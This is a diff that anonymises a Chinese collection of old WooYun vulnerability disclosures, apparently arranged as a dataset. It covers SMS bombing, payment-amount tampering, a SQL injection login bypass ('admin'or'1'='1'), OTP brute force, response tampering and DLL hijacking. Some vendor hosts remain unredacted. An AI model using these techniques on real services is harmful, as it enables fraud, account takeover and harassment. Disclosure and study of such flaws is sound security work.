-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2012-011957] 某互联网公司找回密码短信无限发
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -2283,7 +2283,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发送短信的数据：POST /cgi-bin/mmsupport-bin/getresetpwdurl HTTP/1.1Host: support.weixin.qq.comConnection: keep-aliveContent-Length: 85Cache-Control: max-age=0Origin: http://support.weixin.qq.comUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.152 Safari/535.19 CoolNovo/2.0.3.55Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml
+**详情**: 发送短信的数据：POST /cgi-bin/mmsupport-bin/getresetpwdurl HTTP/1.1Host: support.weixin.某互联网公司.comConnection: keep-aliveContent-Length: 85Cache-Control: max-age=0Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.152 Safari/535.19 CoolNovo/[IP已脱敏]Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml
 
 **POC**: 手机截图麻烦，不证明
 
@@ -2395,7 +2395,7 @@
 
 **详情**: 系统后台登陆危险字符未过滤。
 
-**POC**: WooYun: 某城市卡通系统存在严重越权漏洞可能导致大量金融数据泄露看到路人甲神提交的漏洞后发现另一个连接也存在这个问题http://www.chengtongka.com/login.php，在密码登陆处输入账号 admin'or'1'='1 密码：admin'or'1'='1。进入后台了。好多信息都可以修改，我神马都没做。对了，还有福利
+**POC**: WooYun: 某城市卡通系统存在严重越权漏洞可能导致大量金融数据泄露看到路人甲神提交的漏洞后发现另一个连接也存在这个问题https://example.com/[已脱敏] admin'or'1'='1 密码：admin'or'1'='1。进入后台了。好多信息都可以修改，我神马都没做。对了，还有福利
 
 **绕过**: 直接利用
 
@@ -2403,8 +2403,8 @@
 ---
 
 ---
-### [wooyun-2014-047610] APP安全#中国电信某客户端接口未限制导致短信轰炸
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-047610] APP安全#某运营商某客户端接口未限制导致短信轰炸
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -2461,7 +2461,7 @@
 
 **详情**: 企业侧互联网综合管理平台存在密码重置逻辑漏洞，可直接重置管理员密码http://xxxxxxxx/ucenter/login/loginAction!login.actionpostnewpwd=%21QAZ2wsx&newpwd1=%21QAZ2wsx&uid=system&question=&answer=china&step=4&act=forgetstep改为4 可直接重置密码
 
-**POC**: 随便找一个证明http://122.225.92.243:8080/ucenter/forget/forgetAction!forget.actionhttp://www.act-telecom.com/Index.asp 这个是厂商主页。
+**POC**: 随便找一个证明http://[IP已脱敏] 这个是厂商主页。
 
 **绕过**: 直接利用
 
@@ -2535,8 +2535,8 @@
 ---
 
 ---
-### [wooyun-2014-083402] [绕过修补]携程通过uid继续遍历用户邮箱账号
-**厂商**: 携程旅行网 | **年份**: 2014 | **类型**: 敏感信息泄露
+### [wooyun-2014-083402] [绕过修补]某旅游平台通过uid继续遍历用户邮箱账号
+**厂商**: 某旅游平台旅行网 | **年份**: 2014 | **类型**: 敏感信息泄露
 
 **元思考**: 触发信号: 功能测试
 
@@ -2547,7 +2547,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这个洞我主要是看http://wooyun.org/bugs/wooyun-2014-077356这里提交了修复后，无聊看了一下，虽然前端显示部分为***。但返回的数据包里面隐藏了完整的email地址。导致再次遍历用户邮箱账号。
+**详情**: 这个洞我主要是看https://example.com/[已脱敏]
 
 **POC**: 地址：www.ctrip.com/member/confirm.asp?uid=admin&spec=890294
 
@@ -2557,8 +2557,8 @@
 ---
 
 ---
-### [wooyun-2014-052952] 淘宝某活动可短信轰炸
-**厂商**: 淘宝网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-052952] 某电商平台某活动可短信轰炸
+**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -2569,7 +2569,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 活动页面 http://www.taobao.com/go/act/ebook/ebook_th_khy.php?spm=a1z02.1.882417833.d4911913.A5FgOq&scm=1217.1.1.375直接get发送http://thboss.taobao.com/activity/sendAppUrlBySms.do?phone=186******88&type=2&_ksTS=1394089612815_22&callback=jsonp23
+**详情**: 活动页面 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2579,8 +2579,8 @@
 ---
 
 ---
-### [wooyun-2013-036607] 百度影音最新版本多处DLL劫持
-**厂商**: 百度 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-036607] 某搜索引擎影音最新版本多处DLL劫持
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -2591,7 +2591,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: BaiduPlayer.exe运行时会加载多个不存在的DLL文件正常劫持正常运行安装目录bdplayerexchs.dll安装目录bdplayerexcht.dll安装目录bdplayerexchs.dll系统目录C:\windows\system32\dwmapi.dll正常劫持不正常运行安装目录bdlog.dll安装目录log_debug.dll安装目录serviceContainer.dll假如百度影音安装在C盘劫持路径为：C:\Program Files\Baidu\BaiduPlayer\3.2.0.51\以其中劫持bdplayerexchs.dll为例，那么bdplayerexchs.dll这个DLL放在与BaiduPlayer.exe同目录下，可在BaiduPlayer.exe运行时同时加载。同时百度影音运行前还会加载系统目录下不存在的DLL文件C:\windows\syst
+**详情**: BaiduPlayer.exe运行时会加载多个不存在的DLL文件正常劫持正常运行安装目录bdplayerexchs.dll安装目录bdplayerexcht.dll安装目录bdplayerexchs.dll系统目录C:\windows\system32\dwmapi.dll正常劫持不正常运行安装目录bdlog.dll安装目录log_debug.dll安装目录serviceContainer.dll假如某搜索引擎影音安装在C盘劫持路径为：C:\Program Files\Baidu\BaiduPlayer\[IP已脱敏]\以其中劫持bdplayerexchs.dll为例，那么bdplayerexchs.dll这个DLL放在与BaiduPlayer.exe同目录下，可在BaiduPlayer.exe运行时同时加载。同时某搜索引擎影音运行前还会加载系统目录下不存在的DLL文件C:\windows\syst
 
 **POC**: (见原文)
 
@@ -2635,7 +2635,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞内容：	 1、下单后选择支付2.3.查看支付跳转链接如下:http://shop.letv.com/goPay.html?amount=3489&pId=ON-LEZF-ALIPAY-BALANCE-ALP&oId=1403071626642&stage=1&pInfo=ON-LEZF-ALIPAY-BALANCE-ALP_0_0_3489把两处金额改为0.1元：http://shop.letv.com/goPay.html?amount=0.1&pId=ON-LEZF-ALIPAY-BALANCE-ALP&oId=1403071626642&stage=1&pInfo=ON-LEZF-ALIPAY-BALANCE-ALP_0_0_0.1
+**详情**: 漏洞内容：	 1、下单后选择支付2.3.查看支付跳转链接如下:https://example.com/[已脱敏]
 
 **POC**: 4.如图。
 
@@ -2667,8 +2667,8 @@
 ---
 
 ---
-### [wooyun-2013-018806] QQ微信可以绕过QQ邮箱独立密码 收取/发送 邮件
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-018806] 某互联网公司某互联网公司可以绕过某互联网公司邮箱独立密码 收取/发送 邮件
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -2679,9 +2679,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先要使用没有设置QQ邮箱独立密码的QQ登录微信打开QQ邮箱提醒的插件。（若使用已经设置独立密码的QQ登录，则需要独立密码开启此插件）然后在使用另外的设置了邮箱独立密码的QQ登录时，不需要独立密码即可收取和发送邮件。（但不能查看所有邮件，只能查看自上次登录开始所接收到的邮件）
+**详情**: 首先要使用没有设置某互联网公司邮箱独立密码的某互联网公司登录某互联网公司打开某互联网公司邮箱提醒的插件。（若使用已经设置独立密码的某互联网公司登录，则需要独立密码开启此插件）然后在使用另外的设置了邮箱独立密码的某互联网公司登录时，不需要独立密码即可收取和发送邮件。（但不能查看所有邮件，只能查看自上次登录开始所接收到的邮件）
 
-**POC**: 微信4.5（最新）版本设计不严，导致了这个逻辑缺陷。测试：这是设置了独立密码的QQ邮箱，我们给它发送邮件，是无法查看的。但使用微信的QQ邮箱插件时，可以看到：
+**POC**: 某互联网公司4.5（最新）版本设计不严，导致了这个逻辑缺陷。测试：这是设置了独立密码的某互联网公司邮箱，我们给它发送邮件，是无法查看的。但使用某互联网公司的某互联网公司邮箱插件时，可以看到：
 
 **绕过**: 直接利用
 
@@ -2689,8 +2689,8 @@
 ---
 
 ---
-### [wooyun-2013-041742] IOS支付宝绕过密码登录原手机所有使用过的支付宝帐号
-**厂商**: 支付宝 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-041742] IOS某电商平台绕过密码登录原手机所有使用过的某电商平台帐号
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -2701,9 +2701,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝可能在手机端记录了用户的登陆信息， 由于设计缺陷可以用以下方法绕过密码登录手机上所有使用过的支付宝帐号：1.删除支付宝 2.重新安装支付宝 3.再打开支付宝就显本机登录过的支付宝帐号，随便点一个不用密码就可以进入。漏洞在IOS上应该都存在(支付宝帐号要在手机上做过交易操作，纯登录可能无法重现)，暂没测试安卓设备。
+**详情**: 某电商平台可能在手机端记录了用户的登陆信息， 由于设计缺陷可以用以下方法绕过密码登录手机上所有使用过的某电商平台帐号：1.删除某电商平台 2.重新安装某电商平台 3.再打开某电商平台就显本机登录过的某电商平台帐号，随便点一个不用密码就可以进入。漏洞在IOS上应该都存在(某电商平台帐号要在手机上做过交易操作，纯登录可能无法重现)，暂没测试安卓设备。
 
-**POC**: 原来支付宝登录介面是这样的，必须输密码现删除支付宝再重新安装再打开支付宝就发现问题了，会显示原来登录过的支付宝帐号，并不需要密码就可以点进去这个手势密码不是原来的,重新设置就可以绕过密码进入了
+**POC**: 原来某电商平台登录介面是这样的，必须输密码现删除某电商平台再重新安装再打开某电商平台就发现问题了，会显示原来登录过的某电商平台帐号，并不需要密码就可以点进去这个手势密码不是原来的,重新设置就可以绕过密码进入了
 
 **绕过**: 过滤绕过
 
@@ -2745,7 +2745,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: pps影音PPstream（版本3,1,0,1107），安装程序为官网ppstreamsetup.exe（2013.08.14.10.33.57），windows xp sp3环境，ppstream运行时会试图加载一个不带路径的tsr.dll文件，如果在音视频文件目录下放置一个恶意的tsr.dll文件，当用户双击打开该音视频文件时，恶意DLL即被加载触发，危害性不用说了吧。备注：ppskernel.exe也同样存在该问题，会加载tsr.dll文件。
+**详情**: pps影音PPstream（版本3,1,0,1107），安装程序为官网ppstreamsetup.exe（2013.[IP已脱敏].57），windows xp sp3环境，ppstream运行时会试图加载一个不带路径的tsr.dll文件，如果在音视频文件目录下放置一个恶意的tsr.dll文件，当用户双击打开该音视频文件时，恶意DLL即被加载触发，危害性不用说了吧。备注：ppskernel.exe也同样存在该问题，会加载tsr.dll文件。
 
 **POC**: (见原文)
 
@@ -2811,9 +2811,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 购物车可以修改物品数量为负数（抓包修改）去支付后跳转至支付宝页面邮费付不起，不然就买了。然后也不会算怎么拼凑出最小值，就不付了
+**详情**: 购物车可以修改物品数量为负数（抓包修改）去支付后跳转至某电商平台页面邮费付不起，不然就买了。然后也不会算怎么拼凑出最小值，就不付了
 
-**POC**: 购物车可以修改物品数量为负数（抓包修改）去支付后跳转至支付宝页面邮费付不起，不然就买了。然后也不会算怎么拼凑出最小值，就不付了
+**POC**: 购物车可以修改物品数量为负数（抓包修改）去支付后跳转至某电商平台页面邮费付不起，不然就买了。然后也不会算怎么拼凑出最小值，就不付了
 
 **绕过**: 直接利用
 
@@ -2835,7 +2835,7 @@
 
 **详情**: 先看一下官网。。。啥票都可以买，电影票,飞机票,火车票,演出门票还是先选个门票，我选的张靓颖的演唱会门票780元，然后购买，填写购票人资料和地址，选择在线支付，再提交抓包。。。我把780改为了1
 
-**POC**: 然后返回下单成功。。。到支付宝付款付款金额为1元我没有付款，只做测试
+**POC**: 然后返回下单成功。。。到某电商平台付款付款金额为1元我没有付款，只做测试
 
 **绕过**: 直接利用
 
@@ -2865,8 +2865,8 @@
 ---
 
 ---
-### [wooyun-2013-023263] 支付宝上信用卡提现的实现
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-023263] 某电商平台上信用卡提现的实现
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -2877,7 +2877,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝上向他人转账时，规则是不可以使用信用卡来付的但是有个找他人代付的功能而被要求代付的人的支付页面却是可以用信用卡支付的业务逻辑上表现出的结果是，代付行为等同于购买行为但实质上却实现了转账的功能而且被转帐方的钱可以提现到储蓄卡中，从而间接实现了信用卡套现我不知道是不是这个规则是允许的，我个人觉得不妥
+**详情**: 某电商平台上向他人转账时，规则是不可以使用信用卡来付的但是有个找他人代付的功能而被要求代付的人的支付页面却是可以用信用卡支付的业务逻辑上表现出的结果是，代付行为等同于购买行为但实质上却实现了转账的功能而且被转帐方的钱可以提现到储蓄卡中，从而间接实现了信用卡套现我不知道是不是这个规则是允许的，我个人觉得不妥
 
 **POC**: 我用我的三个帐号实现了把信用卡里的钱提现到了银行卡中a帐号给b帐号付款，请求c帐号代付，c帐号用信用卡支付成功，b帐号提现到储蓄卡成功补充点细节，不知道对结果是不是有影响的。有一个帐号我使用的是代理登录的，而且b和c帐号绑定的是同一个实名
 
@@ -2921,9 +2921,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://world.soufun.com/World.WebUI/DataModule/SendCheckCode.ashx?phone=你的手机号一个简单的循环就可以弄短信轰炸机了
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://world.soufun.com/World.WebUI/DataModule/SendCheckCode.ashx?phone=你的手机号
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2931,8 +2931,8 @@
 ---
 
 ---
-### [wooyun-2011-02550] qq音乐bug
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-02550] 某互联网公司音乐bug
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -2989,7 +2989,7 @@
 
 **详情**: 我们先去注册一个账号 等会用来测试 账号密码如下注册成功现在我们重新登录 然后抓包
 
-**POC**: 看下我们抓的包POST http://bbs.hiapk.com/member.php?mod=logging&action=login&loginsubmit=yes&loginhash=Lx7U6 HTTP/1.1Host: bbs.hiapk.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: 
+**POC**: 看下我们抓的包POST https://example.com/[已脱敏] HTTP/1.1Host: bbs.hiapk.comUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: 
 
 **绕过**: 直接利用
 
@@ -2997,8 +2997,8 @@
 ---
 
 ---
-### [wooyun-2012-07015] 百度应用，MD5在线解密，解密结果为32位加密密文
-**厂商**: 百度 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-07015] 某搜索引擎应用，MD5在线解密，解密结果为32位加密密文
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -3031,7 +3031,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 要检测你的手机是否也存在这个问题，如果你的手机存在这一远程擦除漏洞，访问这个地址http://dylanreeve.com/phone.php后将会自动显示手机的 IMEI 号。
+**详情**: 要检测你的手机是否也存在这个问题，如果你的手机存在这一远程擦除漏洞，访问这个地址https://example.com/[已脱敏] IMEI 号。
 
 **POC**: (见原文)
 
@@ -3041,7 +3041,7 @@
 ---
 
 ---
-### [wooyun-2014-052144] RenderBus通过支付宝充值存在用户输入校验问题和汇率逻辑漏洞
+### [wooyun-2014-052144] RenderBus通过某电商平台充值存在用户输入校验问题和汇率逻辑漏洞
 **厂商**: Renderbus | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
@@ -3053,13 +3053,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在“普通渲染充值”页面，输入金额，借助开发人员工具修改“货币”的 Value 属性为其他货币（如“GBP”），并将“支付方式”中支付宝的选项 style 属性中“display:none;”删除，可以达到利用汇率逻辑错误漏洞的目的。
+**详情**: 在“普通渲染充值”页面，输入金额，借助开发人员工具修改“货币”的 Value 属性为其他货币（如“GBP”），并将“支付方式”中某电商平台的选项 style 属性中“display:none;”删除，可以达到利用汇率逻辑错误漏洞的目的。
 
-**POC**: 支付宝中显示“充值9元（CNY）”RenderBus 中显示“成功充值9GBP”
+**POC**: 某电商平台中显示“充值9元（CNY）”RenderBus 中显示“成功充值9GBP”
 
 **绕过**: 直接利用
 
-**修复**: 增加服务器端输入验证，实际入账金额以 支付宝通知消息 为准。
+**修复**: 增加服务器端输入验证，实际入账金额以 某电商平台通知消息 为准。
 ---
 
 ---
@@ -3075,7 +3075,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 说明：业务逻辑没有分清，导致呢币类素材可以被共享分素材的下载地址下载到。详情看图片及代码步骤：1、新注册一个帐号，获取到COOKIE，现在昵图用的是SESSION，那么我们就获得SESSION_ID2、找到你想要下载的呢币类的素材地址，如：http://www.nipic.com/show/10458044.html3、使用共享分下载的程序http://down.nipic.com/ajax/download_go 提交ID，即可获得该图的下载地址<?phpfunction get_downlink($nipicUrl){$match = array();preg_match('/^http:\/\/www.nipic.com\/show\/(\d+).html/' , $nipicUrl , $match);$downid = $match[1];$ip = "110.110.110.1
+**详情**: 说明：业务逻辑没有分清，导致呢币类素材可以被共享分素材的下载地址下载到。详情看图片及代码步骤：1、新注册一个帐号，获取到COOKIE，现在昵图用的是SESSION，那么我们就获得SESSION_ID2、找到你想要下载的呢币类的素材地址，如：https://example.com/[已脱敏] 提交ID，即可获得该图的下载地址<?phpfunction get_downlink($nipicUrl){$match = array();preg_match('/^http:\/\/www.nipic.com\/show\/(\d+).html/' , $nipicUrl , $match);$downid = $match[1];$ip = "[IP已脱敏]
 
 **POC**: 红框的就是下载地址了。
 
@@ -3097,7 +3097,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x01 漏洞描述“店小一”商城任意手机号码注册（可爆破短信验证码）+ 一分钱买手机0x02 漏洞地址http://www.dianxiaoyi.com/0x03 任意手机号注册漏洞详细首先，点击注册这里随便输入一个手机号码13333333211然后其他随便，点击发送短信后这时候随便输入一个验证码，系统会即时核对验证码是否正确，这个过程是需要与后台交互然后抓包我经过真的手机验证码试过之后，发现是连续的号码，这里从210200开始然后开始爆破很快有结果，验证码是211986然后填入看看对不对OK，正确，可以成功注册了0x04 0.01元购买商品漏洞详细就买个iPhone吧，加购物车然后直接结算然后这个时候抓包改包将shipping_fee参数改成负数 这里填-5309.99(其实后来知道这是快递费)然后发送，截获包里显示为0.01元最终成果付个款。看看能不能成功呢？
+**详情**: 0x01 漏洞描述“店小一”商城任意手机号码注册（可爆破短信验证码）+ 一分钱买手机0x02 漏洞地址https://example.com/[已脱敏] 任意手机号注册漏洞详细首先，点击注册这里随便输入一个手机号码13333333211然后其他随便，点击发送短信后这时候随便输入一个验证码，系统会即时核对验证码是否正确，这个过程是需要与后台交互然后抓包我经过真的手机验证码试过之后，发现是连续的号码，这里从210200开始然后开始爆破很快有结果，验证码是211986然后填入看看对不对OK，正确，可以成功注册了0x04 0.01元购买商品漏洞详细就买个iPhone吧，加购物车然后直接结算然后这个时候抓包改包将shipping_fee参数改成负数 这里填-5309.99(其实后来知道这是快递费)然后发送，截获包里显示为0.01元最终成果付个款。看看能不能成功呢？
 
 **POC**: 结果必然是成功的啊最后，没看到发货方式是自提。。。好吧，那就算了吧。还想看看他们能不能发货来着。
 
@@ -3129,8 +3129,8 @@
 ---
 
 ---
-### [wooyun-2013-022241] 中国电信wifi免费获取漏洞
-**厂商**: 中国电信网上营业厅 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-022241] 某运营商wifi免费获取漏洞
+**厂商**: 某运营商网上营业厅 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -3151,8 +3151,8 @@
 ---
 
 ---
-### [wooyun-2013-027278] 支付宝钱包/快捷支付应用无需验证手势密码即可成功支付
-**厂商**: 支付宝 | **年份**: 2013 | **类型**: 非授权访问/认证绕过
+### [wooyun-2013-027278] 某电商平台钱包/快捷支付应用无需验证手势密码即可成功支付
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 非授权访问/认证绕过
 
 **元思考**: 触发信号: 功能测试
 
@@ -3163,13 +3163,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 本人有一台安卓的平板电脑，安装了南京光辉互动网络科技有限公司开发的游戏：捕鱼之海底捞，在游戏中可以购买金币，点击购买后，直接调用支付宝钱包的相关程序进行支付，之后出现支付宝的确认支付界面，只有一个“确认付款”按钮，然后很容易就点击支付了，完全不需要校验帐号与密码。确认支付界面也不需要进行手势密码的输入，就可以显示出支付宝余额和余额宝余额。试想，如果游戏开发商做得再隐蔽一些，直接使用程序模拟点击“确认付款”的按钮，那我们的余额就会一步步被扣掉。本人本来不会存放余额在支付宝，最近推出了余额宝，投资基金的，所以转入一些金额在里面，但也元须进行转出或确认，直接将金额扣款了，感觉非常不保险。
+**详情**: 本人有一台安卓的平板电脑，安装了南京光辉互动网络科技有限公司开发的游戏：捕鱼之海底捞，在游戏中可以购买金币，点击购买后，直接调用某电商平台钱包的相关程序进行支付，之后出现某电商平台的确认支付界面，只有一个“确认付款”按钮，然后很容易就点击支付了，完全不需要校验帐号与密码。确认支付界面也不需要进行手势密码的输入，就可以显示出某电商平台余额和余额宝余额。试想，如果游戏开发商做得再隐蔽一些，直接使用程序模拟点击“确认付款”的按钮，那我们的余额就会一步步被扣掉。本人本来不会存放余额在某电商平台，最近推出了余额宝，投资基金的，所以转入一些金额在里面，但也元须进行转出或确认，直接将金额扣款了，感觉非常不保险。
 
-**POC**: 点击购买直接调用支付宝的相关程序进行支付直接显示相关余额信息，进行确认付款付款成功了
+**POC**: 点击购买直接调用某电商平台的相关程序进行支付直接显示相关余额信息，进行确认付款付款成功了
 
 **绕过**: 直接利用
 
-**修复**: 立即删除相关游戏、支付宝钱包、快捷支付登录支付宝，关闭“手机服务”中的无线支付功能
+**修复**: 立即删除相关游戏、某电商平台钱包、快捷支付登录某电商平台，关闭“手机服务”中的无线支付功能
 ---
 
 ---
@@ -3185,7 +3185,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 存在漏洞url：http://www.zhubaodai.com/短信验证直接被绕过，可直接修改用户的手机号1短信验证为前台验证，使用burpsuit抓包得到最后一步修改密码的http包，可直接更改手机号及密码，如图：在返回包中把”isOK”:false 改为 “isOK”：true ，然后可以得到验证通过的页面改完手机号后在密码管理中查看是否成功2.修改密码处有同样漏洞再返回包中加入“isOK”：true ，可进入下一步
+**详情**: 存在漏洞url：https://example.com/[已脱敏] 改为 “isOK”：true ，然后可以得到验证通过的页面改完手机号后在密码管理中查看是否成功2.修改密码处有同样漏洞再返回包中加入“isOK”：true ，可进入下一步
 
 **POC**: (见原文)
 
@@ -3239,8 +3239,8 @@
 ---
 
 ---
-### [wooyun-2012-05084] qq2012beta导致chrome崩溃
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-05084] 某互联网公司2012beta导致chrome崩溃
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -3295,7 +3295,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: 房多多某系统存在弱口令看了这个洞洞，试了试https://yun.fangdd.com/basic/login/login账号test密码asdQWE123@显示账户已禁用！说明针对之前的漏洞进行了修补工作。但是之后在浏览器输入新地址http://yun.fangdd.com/basic/user/my 时，账户神奇的处于登陆成功状态了！分析一下原因：对比下登陆前后cookie信息虽然显示账户禁用，但是分配了一个FDDKEEPINGID，限时24分钟虽然页面没有自动跳转到账户界面，但是实际上的逻辑已经赋予了权限，只要手动输入正确的url即可成功进入账户界面。近千合作项目，泄露合作房地产商项目经理姓名电话近15万条订单信息，并可随意取消订单！点开具体订单，客户信息是没打码的。泄露快钱相关信息：交易参考号，缩略卡号4500条结算清单，可任意修改发票。中介费好高让我去收款可好？！
+**详情**: WooYun: 房多多某系统存在弱口令看了这个洞洞，试了试https://example.com/[已脱敏] 时，账户神奇的处于登陆成功状态了！分析一下原因：对比下登陆前后cookie信息虽然显示账户禁用，但是分配了一个FDDKEEPINGID，限时24分钟虽然页面没有自动跳转到账户界面，但是实际上的逻辑已经赋予了权限，只要手动输入正确的url即可成功进入账户界面。近千合作项目，泄露合作房地产商项目经理姓名电话近15万条订单信息，并可随意取消订单！点开具体订单，客户信息是没打码的。泄露快钱相关信息：交易参考号，缩略卡号4500条结算清单，可任意修改发票。中介费好高让我去收款可好？！
 
 **POC**: 如上所示了
 
@@ -3361,7 +3361,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试不容易，求不查水表，不忽略，再给个合情合理的rank测试环境：住这儿app，ios客户端忘记密码流程中，第一步：http://zhuzher.vanke.com/uip/vhome/user/checkAccount.do是校验用户是否存在的请求。绕过这步点方法有两个：（1）方法1:可以填入正确的手机号码通过验证，此处通过验证根后面实际发送短信到的号码无关系，所以无需关系（2）方法2:随便填入个手机号，修改response的userid字段，修改成一个存在的id，比如说1第二步：http://zhuzher.vanke.com/uip/messagesend/smsSend.do是短信校验码的请求，修改mobile字段即为发送短信到的号码。修改content字段即为发送短信的内容在获得smsSend.do的请求后，可以直接通过回放第二步的包进行轰炸，duang，duang，duang看
+**详情**: 测试不容易，求不查水表，不忽略，再给个合情合理的rank测试环境：住这儿app，ios客户端忘记密码流程中，第一步：https://example.com/[已脱敏]
 
 **POC**: POST /uip/messagesend/smsSend.do HTTP/1.1Host: zhuzher.vanke.comAuthorization: Basic Og==Accept: */*Accept-Encoding: gzip, deflateAccept-Language: zh-Hans;q=1, en;q=0.9, fr;q=0.8, de;q=0.7, ja;q=0.6, nl;q=0.5Content-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 468Connection:
 
@@ -3449,7 +3449,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 和前辈的漏洞http://**.**.**.**/bugs/wooyun-2010-0125244对比了下错误页面发现新版把URL后错误的字符全删了可是ip却被解析为#导致前辈说的可以把poc解码导致漏洞产生图如下直接用前辈的poc即可访问http://utf7.ml/t/uc3.html点击Test it!
+**详情**: 和前辈的漏洞http://**.**.**.**/bugs/wooyun-2010-0125244对比了下错误页面发现新版把URL后错误的字符全删了可是ip却被解析为#导致前辈说的可以把poc解码导致漏洞产生图如下直接用前辈的poc即可访问https://example.com/[已脱敏] it!
 
 **POC**: 测试版本为最新版安卓
 
@@ -3471,7 +3471,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 写个bat和一个reg通过bat文件将reg文件导入导致劫持用户下次打开某个软件（例如QQ）的时候被替换 顺利执行恶意软件过了360主动防御
+**详情**: 写个bat和一个reg通过bat文件将reg文件导入导致劫持用户下次打开某个软件（例如某互联网公司）的时候被替换 顺利执行恶意软件过了360主动防御
 
 **POC**: (见原文)
 
@@ -3493,7 +3493,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.meitun.com/首先去找几件商品一直往下
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 然后支付抓包我把这里修改了 21850  看着修改看是不是变得更低了， 我有一件商品付款成功
 
@@ -3504,7 +3504,7 @@
 
 ---
 ### [wooyun-2012-04112] 我用5块钱买了10000颗云豆
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 购买云豆支付漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 购买云豆支付漏洞
 
 **元思考**: 触发信号: 功能测试
 
@@ -3539,7 +3539,7 @@
 
 **详情**: 可获得所有的邮箱，操作较为简单，主要就是希望rank多一点
 
